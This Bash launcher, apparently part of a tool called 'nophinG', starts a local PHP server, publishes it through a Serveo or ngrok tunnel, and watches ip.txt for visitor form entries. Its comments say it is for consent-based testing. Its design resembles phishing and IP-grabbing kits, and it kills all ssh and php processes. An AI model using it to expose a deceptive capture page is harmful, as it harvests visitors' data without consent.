#!/bin/bash
# 
# Versi Final
# Script ini hanya menjalankan PHP built-in server dan membuka tunnel (Serveo/Ngrok).
# Gunakan bersama halaman HTML yang meminta persetujuan (consent) untuk pengujian/penelitian.

# Fungsi untuk trap ctrl+c
trap ctrl_c INT

ctrl_c() {
    echo -e "\n[!] Terdeteksi Ctrl+C, kembali ke menu pilihan..."
    pkill -f php >/dev/null 2>&1
    pkill -f ssh >/dev/null 2>&1
    pkill -f ngrok >/dev/null 2>&1
    select_tunnel_loop
}

stop() {
    echo "[*] Membersihkan proses..."
    pkill -f php >/dev/null 2>&1
    pkill -f ssh >/dev/null 2>&1
    pkill -f ngrok >/dev/null 2>&1
    exit 1
}

dependencies() {
    command -v php >/dev/null 2>&1 || { echo "[!] PHP belum terinstall!"; exit 1; }
    command -v ssh >/dev/null 2>&1 || { echo "[!] SSH belum terinstall!"; exit 1; }
    command -v curl >/dev/null 2>&1 || { echo "[!] Curl belum terinstall!"; exit 1; }
}

banner() {
    clear
    echo -e "\e[1;92m================================================================\e[0m"
    echo -e "\e[1;96m"
    echo " _   _       _   _       _   _       _   _ "
    echo "| \\ | | ___ | |_| |_   _| |_| | ___ | |_| |"
    echo "|  \\| |/ _ \\| __| | | | | __| |/ _ \\| __| |"
    echo "| |\\  | (_) | |_| | |_| | |_| | (_) | |_|_|"
    echo "|_| \\_|\\___/ \\__|_|\\__,_|\\__|_|\\___/ \\__(_)"
    echo -e "\e[0m"
    echo -e "\e[1;93m                ✦✦✦   nophinG   ✦✦✦\e[0m"
    echo -e "\e[1;95m                     by Adrian\e[0m"
    echo -e "\e[1;92m================================================================\e[0m"
}

create_ip_file() {
    [[ ! -f ip.txt ]] && touch ip.txt
}

start_php() {
    fuser -k 3333/tcp >/dev/null 2>&1
    php -S localhost:3333 >/dev/null 2>&1 &
    sleep 2
}

start_serveo() {
    echo "[*] Memulai Serveo (tunnel)..."
    [[ -f sendlink ]] && rm sendlink
    ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:3333 serveo.net 2>/dev/null > sendlink &
    sleep 8
    link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
    echo "[+] Serveo link: $link"
    echo "[*] Menunggu entri dari form (lihat ip.txt untuk ringkasan)..."
    tail -f ip.txt
}

start_ngrok() {
    command -v ngrok >/dev/null 2>&1 || { echo "[!] Ngrok belum terinstall!"; exit 1; }
    echo "[*] Memulai Ngrok (tunnel)..."
    ./ngrok http 3333 >/dev/null 2>&1 &

    echo "[*] Menunggu Ngrok URL..."
    while true; do
        link=$(curl --silent http://127.0.0.1:4040/api/tunnels | grep -o '"public_url":"[^"]*' | cut -d'"' -f4)
        [[ -n "$link" ]] && break
        sleep 2
    done
    echo "[+] Ngrok link: $link"
    echo "[*] Menunggu entri dari form (lihat ip.txt untuk ringkasan)..."
    tail -f ip.txt
}

select_tunnel() {
    echo "----- Pilih Tunnel -----"
    echo "[1] Serveo.net"
    echo "[2] Ngrok"
    echo "[0] Keluar"
    read -p "[Default 1] Pilih: " option
    option="${option:-1}"
}

select_tunnel_loop() {
    while true; do
        banner
        dependencies
        create_ip_file
        start_php
        select_tunnel

        case "$option" in
            1)
                start_serveo
                ;;
            2)
                start_ngrok
                ;;
            0)
                echo "Keluar dari program..."
                stop
                ;;
            *)
                echo "[!] Pilihan tidak valid. Silakan coba lagi."
                sleep 1
                ;;
        esac
    done
}

# Mulai program
select_tunnel_loop
